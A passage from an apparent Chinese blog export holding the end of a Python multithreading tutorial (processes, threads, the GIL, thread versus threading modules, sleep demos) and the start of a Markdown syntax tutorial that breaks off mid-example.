计算机程序只不过是磁盘中可执行的，二进制（或其他类型）的数据。它们只有在被读取到内存中，被操作系统调用的时候才开始它们的生命期。进程（有时叫重量级进程）是程序的一次执行。每个进程都有自己的地址空间，内存，数据栈以及其它记录其运行轨迹的辅助数据。OS管理在其上运行的所有进程，并为这些进程公平的分配时间。进程也可以通过fork和spawn操作来完成其它的任务。不过各个进程都有自己的内存空间，数据栈等，因此只能使用进程间通信(IPC)，而不能直接共享信息。</p><p>​       <a href="https://www.cnblogs.com/reality-soul/p/6397021.html" target="_blank" rel="noopener">进程和线程的概念、区别和联系</a></p><p>​       <a href="https://www.cnblogs.com/tiankong101/p/4229584.html" target="_blank" rel="noopener">深入理解线程和进程</a>    </p><h5 id="什么是线程？"><a href="#什么是线程？" class="headerlink" title="什么是线程？"></a>什么是线程？</h5><p>​    线程（有时也叫轻量级进程）和进程有点像，不同的是，所有的线程运行在同一个进程中，共享相同的运行环境。</p><p>​    线程有开始，顺序执行和结束三部分。它有一个自己的指令指针，记录自己运行到什么地方。线程的运行可能被抢占（中断），或暂时的被挂起（睡眠），让其他的线程运行，这叫做让步。</p><p>​    一个进程中的各个线程之间共享同一片数据空间，所以线程之间可以比进程之间更方便地共享数据以及相互通讯。线程一般都是并发执行的，正是由于这种并行和数据共享的机制使得多个任务的合作变为可能。</p><p>​    在单CPU的系统中，真正的并发是不可能的，每个线程会被安排成每次只运行一小会，然后就把CPU让出来，让其他的线程去运行。在进程的整个运行过程中，每个线程都只做自己的事，在需要的时候跟其他的线程共享运行的结果。当然，这样的共享是存在危险的，如果多个线程共同访问同一片数据，则由于数据的访问顺序不一样，有可能造成<strong>结果不一致</strong>问题。这就是<strong>竞态条件（race condition）</strong>。但可以通过大多数线程库带有一系列的同步原语，来控制线程的执行和数据的访问。还有就是由于有的函数会在完成之前阻塞住，在没有特别为多线程做修改的情况下，这种”贪婪”的函数会让CPU的时间分配有所倾斜，导致各个线程分配的运行时间可能不尽相同，不尽公平。</p><h4 id="Python线程和GIL"><a href="#Python线程和GIL" class="headerlink" title="Python线程和GIL"></a>Python线程和GIL</h4><h5 id="全局解释锁（GIL）"><a href="#全局解释锁（GIL）" class="headerlink" title="全局解释锁（GIL）"></a>全局解释锁（GIL）</h5><p>​    Python代码的执行是由Python虚拟机（也叫解释器主循环）来控制，Python在设计之初就考虑到要在主循环中，同时只有一个线程在执行，就像单CPU系统中运行多个进程那样，内存中可以存放多个程序，但任意时刻，只有一个程序在CPU中运行。同样地道理，虽然Python解释器中可以运行多个线程，但在任意时刻，只有一个线程在解释器中运行。</p><p>​    对Python虚拟机的访问由全局解释器锁(GIL)来控制，正是这个锁能保证同一时刻只有一个线程在运行。在多线程的环境下，Python虚拟机按以下方式执行：</p><ol><li><p>设置GIL</p></li><li><p>切换到一个线程去运行</p></li><li><p>运行</p><p>a.指定数量的字节码指令，或者，</p><p>b.线程主动让出控制（可以调用time.sleep(0)）</p></li><li><p>把线程设置为睡眠状态</p></li><li><p>解锁GIL</p></li><li><p>再次重复以上所有步骤</p></li></ol><p>​       在调用外部代码（如C/C++扩展函数）的时候，GIL将会被锁定，直到这个函数结束为止（因为在这期间内有Python的字节码被运行，所以不会做线程切换），编写扩展的程序员可以主动解锁GIL。</p><p>​    对于I/O密集型的Python程序比计算密集型程序更能充分利用多线程环境的好处。这是因为，对所有面向I/O的（会调用内建的OS的C代码的）程序来说，GIL会在这个I/O调用之前被释放，以允许其它的线程在这个线程等待I/O的时候运行。如果某线程并未使用很多I/O操作，它会在自己的时间片内一直占用处理器和GIL。</p><p>​        <a href="https://www.cnblogs.com/ybjourney/p/6429715.html" target="_blank" rel="noopener">GIL的一点源码</a></p><h5 id="退出线程"><a href="#退出线程" class="headerlink" title="退出线程"></a>退出线程</h5><p>​    当一个线程结束计算，它就退出了。线程可以调用thread.exit()之类的退出函数，也可以使用Python退出进程的标准方法，如sys.exit()或抛出一个SystemExit异常等。但是，我们不可以直接kill掉一个进程。</p><p>​    有两个和线程相关的模块thread和threading，但不建议直接使用thread模块，显而易见的一个原因是当主进程退出的时候，所有其它线程没有被清除就退出了。但另一个模块threading就能确保所有”重要的”子线程都退出后，进程才会结束。</p><p>​    而且，主线程应当作为一个好的管理者，它要了解每个线程都要做些什么事，线程都需要什么数据和参数，以及在线程结束的时候，它们都提供了什么结果。这样，主线程就可以把各个线程的结果组合成一个有意义的最后结果。</p><p>​    实际上Python提供了几个用于多线程编程的模块，包括thread,threading和Queue等。thread和threading模块允许程序员创建和管理线程。thread模块提供了基本的线程和锁的支持，而threading提供了更高级别，功能更强的线程管理功能。Queue模块允许用户创建一个用于多个线程之间共享数据的队列数据结构。</p><h5 id="没有线程支持的情况"><a href="#没有线程支持的情况" class="headerlink" title="没有线程支持的情况"></a>没有线程支持的情况</h5><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#onethr.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep,ctime</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loop0</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'start loop0 at:'</span>,ctime())</span><br><span class="line">    sleep(<span class="number">4</span>)</span><br><span class="line">    print(<span class="string">'loop0 done at:'</span>,ctime())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loop1</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'start loop1 at:'</span>, ctime())</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">'loop1 done at:'</span>, ctime())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'starting at:'</span>, ctime())</span><br><span class="line">    loop0()</span><br><span class="line">    loop1()</span><br><span class="line">    print(<span class="string">'all done at:'</span>,ctime())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><p>​    我们会使用time.sleep()函数来演示线程是怎样工作的。time.sleep()需要一个浮点型参数，来指定”睡眠”的时间(单位秒)。这就意味着，程序的运行会被挂起指定的时间。    </p><p>​    我们要创建两个”计时循环”。一个睡眠4秒钟，一个睡眠2秒钟，分别是loop0()和loop1().（我们命名为”loop0”和”loop1”表示我们将有一个循环的序列）。    </p><p>​    如果我们在一个进程或者一个线程中，顺序的执行loop0()和loop1()，那运行的总时间为6秒。在启动loop0(),loop1(),和其它的代码时，也要花去一些时间，所以，我们看到的总时间也有可能会是7秒钟。</p><p>​    假定loop0和loop1里做的不是睡眠，而是各自独立的，不相关的运算，各自的运算结果到最后将会汇总成一个最终的结果。这时，如果能让这些计算并行执行的话，那这样就会减少总的运行时间，这就是多线程编程的前提条件。</p><h5 id="避免使用thread模块"><a href="#避免使用thread模块" class="headerlink" title="避免使用thread模块"></a>避免使用thread模块</h5><p>​    不建议使用thread模块，首先是因为更高级别的threading模块更为先进，对线程的支持更为完善，而且使用thread模块里的属性有可能会与threading模块出现冲突。其次，低级别的thread模块的同步原语很少（实际上只有一个），而threading模块则有很多。</p><p>​    另一个不要使用thread原因是，对于你的进程什么时候应该结束完全没有控制，当主线程结束时，所有的线程都会被强制结束掉，没有警告也不会有正常的清除工作。而threading模块能确保<strong><em>重要的</em></strong>子线程退出后进程才退出。</p><p>​    只建议那些有经验的专家想访问线程的底层结构的时候，才使用thread模块。</p><h4 id="thread模块和threading模块"><a href="#thread模块和threading模块" class="headerlink" title="thread模块和threading模块"></a>thread模块和threading模块</h4><h5 id="thread模块"><a href="#thread模块" class="headerlink" title="thread模块"></a>thread模块</h5><p>​    thread模块除了产生线程外，thread模块也提供了基本的同步数据结构锁对象(lock object,也叫原语锁，简单锁，互斥锁，互斥量，二值信号量)，同步原语与线程的管理是密不可分的。</p><p>​    下表列出常用的线程函数以及LockType类型的锁对象的方法。</p><table><thead><tr><th style="text-align:left">函数</th><th>描述</th></tr></thead><tbody><tr><td style="text-align:left">thread模块函数</td><td></td></tr><tr><td style="text-align:left">start_new_thread(function,args,kwargs=None)</td><td>产生一个新的线程，在新线程中用指定的参数和可选的kwargs来调用这个函数。</td></tr><tr><td style="text-align:left">allocate_lock()</td><td>分配一个LockType类型的锁对象</td></tr><tr><td style="text-align:left">exit()</td><td>让线程退出</td></tr><tr><td style="text-align:left"><strong>LockType类型锁对象方法</strong></td><td></td></tr><tr><td style="text-align:left">acquire(wait=None)</td><td>尝试获得锁对象</td></tr><tr><td style="text-align:left">locked()</td><td>如果获取了锁对象返回True,否则返回False</td></tr><tr><td style="text-align:left">release()</td><td>释放锁</td></tr><tr><td style="text-align:left"></td></tr></tbody></table><p>​    start_new_thread()函数式thread模块的一个关键函数，它的语法与内建的apply()函数完全一样，其参数为:函数，函数的参数以及可选的关键字参数。不同的是，函数不是在主线程里运行，而是产生一个新的线程来运行这个函数。</p><p>​    这里我们执行的是和onethr.py中一样的循环，不同的是，这一次我们使用的是thread模块提供的多线程的机制。两个循环并发的执行（显然，短的那个先结束）。总的运行时间为最慢的那个线程的运行时间，而不是所有线程的运行时间之和。</p><p>​    </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#mtsleep1.py</span></span><br><span class="line"><span class="keyword">import</span> thread  <span class="comment">#需要python2环境</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep,ctime</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loop0</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'start loop0 at:'</span>,ctime())</span><br><span class="line">    sleep(<span class="number">4</span>)</span><br><span class="line">    print(<span class="string">'loop0 done at:'</span>,ctime())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loop1</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'start loop1 at:'</span>, ctime())</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">'loop1 done at:'</span>, ctime())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'starting at:'</span>, ctime())</span><br><span class="line">    thread.start_new_thread(loop0,())</span><br><span class="line">    thread.start_new_thread(loop1,())</span><br><span class="line">    sleep(<span class="number">6</span>)</span><br><span class="line">    print(<span class="string">'all done at:'</span>,ctime())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><p>​    这个程序的输出与之前的输出大不相同，之前是运行了6,7秒，而现在则是4秒，是最长的循环的运行时间和其它代码的时间之和。睡眠4秒和睡眠2秒是并发执行的，这样就使得总的运行时间被缩短了。loop1在loop0前面就结束了，而且程序多了一个sleep(6)的函数调用。为什么要加入sleep(6)，这是因为如果没有让主线程停下来，那主线程就会运行下一条语句，显示”all done”，然后就关闭了运行着的loop0()和loop1()的两个线程，退出了。</p><p>​    的确这里应该有更好的管理线程的办法，而不是在主线程里面做一个额外的延时6s的操作。也就是说，我们要写让主线程停下来等所有子线程结束之后再继续运行的代码，这也是线程需要同步的原因。用sleep()函数做线程的同步操作是不可靠的，因为如果有循环的执行时间不能事先确定的话，这可能会造成主线程过早或过晚退出，这就要用到锁了。</p><h3 id="Python多进程"><a href="#Python多进程" class="headerlink" title="Python多进程"></a>Python多进程</h3><h3 id="Python多进程和多线程参考"><a href="#Python多进程和多线程参考" class="headerlink" title="Python多进程和多线程参考"></a>Python多进程和多线程参考</h3><h4 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h4><p><a href="https://www.yiibai.com/concurrency_in_python#" target="_blank" rel="noopener">Python并发编程理论部分1</a></p><p><a href="https://www.cnblogs.com/linhaifeng/articles/7430066.html#_label1" target="_blank" rel="noopener">并发编程理论部分2</a></p><p><a href="http://python.jobbole.com/81546/" target="_blank" rel="noopener">Python模块学习:threading多线程控制和处理</a></p><p><a href="http://www.cnblogs.com/SuperBlee/p/4550359.html" target="_blank" rel="noopener"><em>Python中的multiprocessing和threading</em> </a></p><p><a href="https://blog.csdn.net/seetheworld518/article/details/49639885" target="_blank" rel="noopener"><em>Python 多线程 threading和multiprocessing模块</em> </a></p><p><a href="http://python.jobbole.com/87202/" target="_blank" rel="noopener"><em>Python并发编程之协程/异步IO</em> </a></p><h4 id="python多进程"><a href="#python多进程" class="headerlink" title="python多进程"></a>python多进程</h4><p><a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001431927781401bb47ccf187b24c3b955157bb12c5882d000" target="_blank" rel="noopener">Python多进程基本说明</a></p><p><a href="https://www.cnblogs.com/lxmhhy/p/6052167.html" target="_blank" rel="noopener">实现多进程的几种方式</a></p><p><a href="https://www.cnblogs.com/yang520ming/p/8818447.html" target="_blank" rel="noopener">Python多进程使用说明</a></p><h4 id="python多线程"><a href="#python多线程" class="headerlink" title="python多线程"></a>python多线程</h4><p><a href="https://blog.csdn.net/dongfei2033/article/details/77622265" target="_blank" rel="noopener">Python核心编程-多线程</a></p><p><a href="https://blog.csdn.net/a519640026/article/details/76157999" target="_blank" rel="noopener">Python的一种线程池模型</a></p><p><a href="https://www.cnblogs.com/zhang293/p/7954353.html" target="_blank" rel="noopener">多种方式实现Python线程池</a></p><p><a href="https://blog.csdn.net/qq_31479309/article/details/80082502" target="_blank" rel="noopener">假的多线程</a></p><p><a href="https://www.cnblogs.com/adinosaur/p/7932048.html" target="_blank" rel="noopener">一个进程内运行多个python虚拟机</a></p><p>​    说明：如果想让python多线程，真正支持多核，那么应该 1、重写python编译器(官方cpython)如使用：PyPy解释器 2、调用C语言的链接库 。</p><p>​    而实际上，多核多线程比单核多线程更差，原因是单核下多线程，每次释放GIL，唤醒的那个线程都能获取到GIL锁，所以能够无缝执行，但多核下，CPU0释放GIL后，其他CPU上的线程都会进行竞争，但GIL可能会马上又被CPU0拿到，导致其他几个CPU上被唤醒后的线程会醒着等待到切换时间后又进入待调度状态，这样会造成线程颠簸(thrashing)，导致效率更低 。</p><h4 id="python协程"><a href="#python协程" class="headerlink" title="python协程"></a>python协程</h4><p>​    Python并行的最好策略应当是多进程+协程，既充分利用多核，又充分发挥协程的高效率，可获得极高的性能。 。</p><p>​       <a href="https://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/0013868328689835ecd883d910145dfa8227b539725e5ed000" target="_blank" rel="noopener">Python协程概念</a></p><p>​       <a href="http://python.jobbole.com/86481/" target="_blank" rel="noopener">Python协程的一点剖析</a></p></body></html>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>markdown入门_1</title>
      <link href="/2018/05/08/markdown%E5%85%A5%E9%97%A8%E4%B9%8B1/"/>
      <url>/2018/05/08/markdown%E5%85%A5%E9%97%A8%E4%B9%8B1/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="Markdown基本语法介绍"><a href="#Markdown基本语法介绍" class="headerlink" title="Markdown基本语法介绍"></a>Markdown基本语法介绍</h2><blockquote><p>参考链接:<a href="https://www.jianshu.com/p/b03a8d7b1719" target="_blank" rel="noopener">https://www.jianshu.com/p/b03a8d7b1719</a> </p></blockquote><blockquote><p>简明教程：<a href="https://ouweiya.gitbooks.io/markdown/" target="_blank" rel="noopener">https://ouweiya.gitbooks.io/markdown/</a> </p></blockquote><blockquote><p>有道云MarkDown教程：<a href="http://note.youdao.com/iyoudao/?p=2411" target="_blank" rel="noopener">http://note.youdao.com/iyoudao/?p=2411</a> </p></blockquote><blockquote><p>W3cShcool:<a href="https://www.w3cschool.cn/lme/t13p1sri.html" target="_blank" rel="noopener">https://www.w3cschool.cn/lme/t13p1sri.html</a></p></blockquote><h4 id="1-标题"><a href="#1-标题" class="headerlink" title="1.标题"></a>1.标题</h4><p><strong>代码</strong></p><blockquote><p>注：#后面保持空格</p></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># h1</span><br><span class="line">## h2</span><br><span class="line">### h3</span><br><span class="line">#### h4</span><br><span class="line">##### h5</span><br><span class="line">###### h6</span><br><span class="line">####### h7      // 错误代码</span><br><span class="line">######## h8     // 错误代码</span><br><span class="line">######### h9    // 错误代码</span><br><span class="line">########## h10  // 错误代码</span><br></pre></td></tr></tbody></table></figure><h4 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h4><h1 id="h1"><a href="#h1" class="headerlink" title="h1"></a>h1</h1><h2 id="h2"><a href="#h2" class="headerlink" title="h2"></a>h2</h2><h3 id="h3"><a href="#h3" class="headerlink" title="h3"></a>h3</h3><h4 id="h4"><a href="#h4" class="headerlink" title="h4"></a>h4</h4><h5 id="h5"><a href="#h5" class="headerlink" title="h5"></a>h5</h5><h6 id="h6"><a href="#h6" class="headerlink" title="h6"></a>h6</h6><p>####### h7</p><p>######## h8</p><p>######### h9</p><p>########## h10</p><h4 id="2-分级标题"><a href="#2-分级标题" class="headerlink" title="2.分级标题"></a>2.分级标题</h4><p><strong>代码</strong></p><blockquote><p>注：=-最少可以只写一个，兼容性一般</p></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一级标题</span><br><span class="line">======================</span><br><span class="line">二级标题</span><br><span class="line">---------------------</span><br></pre></td></tr></tbody></table></figure><h4 id="演示-1"><a href="#演示-1" class="headerlink" title="演示"></a>演示</h4><h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h4 id="3-Toc"><a href="#3-Toc" class="headerlink" title="3.Toc"></a>3.Toc</h4><p><strong>代码</strong></p><blockquote><p>注：根据标题生成目录</p></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[TOC]</span><br></pre></td></tr></tbody></table></figure><h4 id="演示-2"><a href="#演示-2" class="headerlink" title="演示"></a>演示</h4><p>[TOC]</p><h4 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h4><h4 id="行内标记"><a href="#行内标记" class="headerlink" title="行内标记"></a>行内标记</h4><h4 id="代码块"><a href="#代码块" class="headerlink" title="++代码块++"></a>++代码块++</h4><h4 id="插入链接"><a href="#插入链接" class="headerlink" title="插入链接"></a>插入链接</h4><h4 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h4><h4 id="插入图片带有链接"><a href="#插入图片带有链接" class="headerlink" title="插入图片带有链接"></a>插入图片带有链接</h4><h4 id="序表"><a href="#序表" class="headerlink" title="序表"></a>序表</h4><h4 id="任务列表"><a href="#任务列表" class="headerlink" title="任务列表"></a>任务列表</h4><h4 id="表情"><a href="#表情" class="headerlink" title="表情"></a>表情</h4><h4 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h4><h4 id="支持内嵌CSS样式"><a href="#支持内嵌CSS样式" class="headerlink" title="支持内嵌CSS样式"></a>支持内嵌CSS样式</h4><h4 id="4-引用"><a href="#4-引用" class="headerlink" title="4.引用"></a>4.引用</h4><p><strong>代码1（单行式）</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">>hello world!</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="演示-3"><a href="#演示-3" class="headerlink" title="演示"></a>演示</h4><blockquote><p>hello world  </p></blockquote><p><strong>代码2（多行式）</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">> hello world!</span><br><span class="line">hello world!</span><br><span class="line">hello world!</span><br></pre></td></tr></tbody></table></figure><p></p><p>或者<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">>hello world!</span><br><span class="line">>hello world!</span><br><span class="line">>hello world!</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="演示-4"><a href="#演示-4" class="headerlink" title="演示"></a>演示</h4><blockquote><p><code>hello world!</code><br><code>hello world!</code><br><code>hello world!</code>  </p></blockquote><p><strong>代码3（多层嵌套）</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">> aaaaaaaa</span><br><span class="line">>> bbbbbbbb</span><br><span class="line">>>> cccccccc</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="演示-5"><a href="#演示-5" class="headerlink" title="演示"></a>演示</h4><blockquote><p>aaaaaaaa</p><blockquote><p>bbbbbbbb</p><blockquote><p>ccccccccc</p></blockquote></blockquote></blockquote><h4 id="5-行内标记"><a href="#5-行内标记" class="headerlink" title="5.行内标记"></a>5.行内标记</h4><blockquote><p>注：用 ` 标记代码块将变成一行  </p></blockquote><p><strong>代码</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">标记之外`hello world`标记之外</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="演示-6"><a href="#演示-6" class="headerlink" title="演示"></a>演示</h4><p>标记之外<code>hello world</code>标记之外  </p><p><strong>错误代码</strong></p><blockquote><p>注：不同平台错误略有差异<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> 标记之外 ` </span><br><span class="line">< div>   </span><br><span class="line">    < div></div></span><br><span class="line">    < div></div></span><br><span class="line">    < div></div></span><br><span class="line">< /div></span><br><span class="line">`标记之外</span><br></pre></td></tr></tbody></table></figure><p></p></blockquote><h4 id="演示-7"><a href="#演示-7" class="headerlink" title="演示"></a>演示</h4><p> 标记之外 <code>< div>   ​    < div></div>​    < div></div>​    < div></div>< /div></code> 标记之外</p><h4 id="6-代码块"><a href="#6-代码块" class="headerlink" title="6.代码块"></a>6.代码块</h4><blockquote><p>注：与上行距离一空行  </p></blockquote><p>**代码1(</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">> 注：用```生成块  </span><br><span class="line">#### 演示</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><div><br>    <div></div><br>    <div></div><br>    <div></div><br></div><br><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">**代码2(Tab)**</span><br><span class="line">> 注：Tab缩进  </span><br><span class="line">#### 演示</span><br></pre></td></tr></tbody></table></figure><p></p><p>我是文字……  </p><pre><code><div>       <div></div>    <div></div>    <div></div></div></code></pre><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">**代码3(自定义语法)**</span><br><span class="line">> 注：根据不同的语言配置不同的代码颜色  </span><br><span class="line"></span><br><span class="line">```javascript</span><br><span class="line">var num = 0;</span><br><span class="line">for (var i = 0; i < 5; i++) {</span><br><span class="line">    num+=i;</span><br><span class="line">}</span><br><span class="line">console.log(num);</span><br></pre></td></tr></tbody></table></figure><h4 id="7-插入链接"><a href="#7-插入链接" class="headerlink" title="7.插入链接"></a>7.插入链接</h4><p><strong>代码1(内链式)</strong>  </p><blockquote><p>注：{:target=”_blank”}跳转方式兼容性一般 ，多数第三方平台不支持跳转  </p></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[百度1](http://www.baidu.com/" 百度一下"){:target="_blank"}</span><br></pre></td></tr></tbody></table></figure><h4 id="演示-8"><a href="#演示-8" class="headerlink" title="演示"></a>演示</h4><p><a href="http://www.baidu.com/" title="百度一下" target="_blank" rel="noopener">百度1</a></p><p><strong>代码2(引用式)</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[百度2][2]{:target="_blank"}</span><br><span class="line">[2]: http://www.baidu.com/   "百度二下"</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="演示-9"><a href="#演示-9" class="headerlink" title="演示"></a>演示</h4><p><a href="http://www.baidu.com/" title="百度二下" target="_blank" rel="noopener">百度2</a> </p><h4 id="8-插入图片"><a href="#8-插入图片" class="headerlink" title="8.插入图片"></a>8.插入图片</h4><p><strong>代码1(内链式)</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![](./01.png '描述')</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="演示-10"><a href="#演示-10" class="headerlink" title="演示"></a>演示</h4><p><img src="C:/Users/wjq/Desktop/markdown/images/01.png" alt>  </p><p><strong>代码2(引用式)</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![name][01]</span><br><span class="line">[01]: ./01.png '描述'</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="演示-11"><a href="#演示-11" class="headerlink" title="演示"></a>演示</h4><p><img src="C:/Users/wjq/Desktop/markdown/images/01.png" alt="name" title="描述">  </p><h4 id="9-插入图片带有链接"><a href="#9-插入图片带有链接" class="headerlink" title="9.插入图片带有链接"></a>9.插入图片带有链接</h4><p><strong>代码</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[![](./01.png '百度')](http://www.baidu.com){:target="_blank"}        // 内链式</span><br><span class="line"></span><br><span class="line">[![](./01.png '百度')][5]{:target="_blank"}                       // 引用式</span><br><span class="line">[5]: http://www.baidu.com</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="演示-12"><a href="#演示-12" class="headerlink" title="演示"></a>演示</h4><h5 id="内链式"><a href="#内链式" class="headerlink" title="内链式"></a>内链式</h5><p><a href="http://www.baidu.com" target="_blank" rel="noopener"><img src="C:/Users/wjq/Desktop/markdown/images/01.png" alt title="百度"></a>  </p><h5 id="引用式"><a href="#引用式" class="headerlink" title="引用式"></a>引用式</h5><p>[<img src="C:/Users/wjq/Desktop/markdown/images/01.png" alt title="百度">][1]{:target=”_blank”}<br>[1]: <a href="http://www.baidu.com" target="_blank" rel="noopener">http://www.baidu.com</a></p><h4 id="10-视频插入"><a href="#10-视频插入" class="headerlink" title="10.视频插入"></a>10.视频插入</h4><blockquote><p>注: Markdown语法是不支持直接插入视频的<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">普遍的做法是 插入HTML的 iframe 框架，通过网站自带的分享功能获取，如果没有可以尝试第二种方法</span><br><span class="line">第二是伪造播放界面，实质是插入视频图片，然后通过点击跳转到相关页面</span><br></pre></td></tr></tbody></table></figure><p></p></blockquote><p><strong>代码1</strong>  </p><blockquote><p>注: 多数第三方平台不支持插入<iframe>视频<br><figure class="highlight plain"><table><tr><td 